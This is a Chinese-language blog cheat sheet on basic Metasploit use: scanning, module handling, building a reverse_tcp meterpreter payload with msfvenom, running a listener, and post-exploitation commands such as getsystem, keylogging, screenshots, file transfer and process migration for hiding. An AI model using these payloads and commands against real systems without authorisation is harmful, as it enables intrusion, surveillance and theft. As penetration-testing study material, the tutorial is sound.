---
title: Metasploit 基本使用
date: 2024-06-01 20:10:00
categories: Security
tags: [Security, Metasploit]
---

<!-- 設定檔位置: ~/.msf4 -->

# 開啟 Metasploit Console
```bash
msfconsole
```

<!--more-->

# 初始化 PostgreSQL 資料庫
```bash
# 初始化資料庫
msfdb init

# 查詢資料庫狀態
db_status
```

# nmap 掃描
```bash
# 基礎掃描
db_nmap -sV -p- [IP]

# 基礎漏洞掃描
db_nmap -sV --script vulners [IP]

# vulners.com 線上漏洞掃描
db_nmap -sV --script vulners [IP]
```
# 模組操作
⭐ 更新可用模組
```bash
msfupdate
```

⭐ 顯示可用模組
```bash
# 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊
show exploits

# 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼
show payloads

# 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集
show auxiliary

# 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作
show post

# 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測
show encoders

# 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload
show nops
```

⭐ 查找模組
```bash
search [模組名稱或關鍵詞]
```

⭐ 模組使用
```bash
# 載入模組
use [模組路徑]

# 查看模組詳情
info

# 設置參數
set [參數名] [參數值]

# 查看當前配置
show options

# 啟動
exploit
```

# payload 基本操作

⭐ 用途介紹

| 用途      | 說明  |
| :------- | :---- |
| command shell | 獲得一個命令行界面，允許攻擊者在目標系統上執行命令   |
| meterpreter | 一種高級的、擴展性強的 payload，提供了豐富的功能，例如文件操作、過程管理、網絡偵查等 |
| vnc | 在目標系統上開啟一個 VNC 服務器，允許攻擊者遠程查看和控制目標桌面 |

⭐ 創建 meterpreter payload :
```bash
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf
```

⭐ 監聽 payload ，等待遠端執行 payload
```bash
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST [監聽機IP位置]
set LPORT [監聽機端口]
exploit
```

⭐ 遠端執行 payload
```bash
# 給予執行權限
chmod +x payload.elf
# 執行 payload
./payload.elf
```

# 後滲透操作(取得shell後)
```bash
# 列出當前活動會話
sessions -l

# 連接到一個會話
sessions -i [會話ID]

# 獲取系統信息
sysinfo

# 獲取使用者信息
getuid

# 獲取系統信息
getsystem

# 獲取shell
shell

# 鍵盤記錄
keyscan_start、keyscan_stop、keyscan_dump

# 屏幕截圖:
screenshot

# 上傳文件、下載文件
download [遠程文件路徑] [本地目標路徑]
upload [本地文件路徑] [遠程目標路徑]

# 執行命令
execute -f [可執行文件] -H

# 隱藏進程在其他進程中
migrate -N [程式]

# 網絡偵查
run packetrecorder、run arp_scanner

# 當前 session 放置背景執行
background
```

{% note warning %}
📜 參考資料
1. [metasploit](https://www.metasploit.com/)
{% endnote %}